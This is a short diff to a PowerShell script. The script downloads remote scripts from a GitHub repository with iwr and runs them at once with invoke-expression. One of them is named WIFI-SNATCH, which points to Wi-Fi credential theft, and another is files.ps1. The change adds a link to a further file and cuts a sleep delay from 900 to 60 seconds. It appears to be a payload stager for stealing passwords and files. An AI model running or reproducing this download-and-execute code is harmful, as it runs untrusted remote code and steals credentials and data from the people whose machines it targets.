@@ -4,11 +4,12 @@ $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH?dl=1; invoke-expr
 
 $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw
 
+https://github.com/skekic16/lol/raw/main/DP
 
 
 
 
-start-sleep 900
+start-sleep 60
 
 
 
